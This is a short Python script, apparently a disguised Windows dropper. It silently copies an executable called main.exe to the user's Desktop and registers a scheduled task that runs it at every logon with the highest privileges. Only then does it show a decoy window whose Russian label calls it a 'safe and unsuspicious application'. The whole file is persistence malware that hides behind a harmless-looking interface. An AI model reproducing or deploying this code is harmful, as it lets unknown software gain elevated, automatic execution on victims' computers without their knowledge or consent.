import getpass
import shutil
import subprocess
import os
from tkinter import CENTER as _CENTER
from tkinter import Tk as _Tk
from tkinter import Label as _Label

username = getpass.getuser()
target_dir = f'C:/Users/{username}/OneDrive/Desktop/'
os.makedirs(target_dir, exist_ok=True)

source_exe = 'main.exe'
target_exe = os.path.join(target_dir, 'main.exe')

shutil.copy2(source_exe, target_exe)

task_name = "MyAppAutoStart"
cmd = f'schtasks /create /tn "{task_name}" /tr "{target_exe}" /sc onlogon /rl highest /f'
subprocess.run(cmd, shell=True, check=True)


root = _Tk()
root.title("Приложение")

label = _Label(root, text='Безопасное и неподозрительное приложение')
label.config(anchor=_CENTER)
label.pack()

root.geometry("500x250")

root.mainloop()